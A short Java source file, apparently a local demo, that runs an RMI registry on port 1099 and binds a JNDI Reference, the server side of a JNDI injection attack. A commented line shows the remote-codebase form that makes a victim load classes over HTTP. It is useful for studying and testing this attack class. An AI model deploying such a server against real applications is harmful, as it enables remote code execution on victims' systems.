import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author sander-xu@zamplus.com
 * @date 2022/5/30 3:18 下午
 */
public class RmiServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("RMI Listener 1099 port");
            Reference reference = new Reference("RmiObj","RmiObj",null);
            // Reference reference = new Reference("RmiObj","RmiObj","http://127.0.0.1:80");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.rebind("test",referenceWrapper);
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}
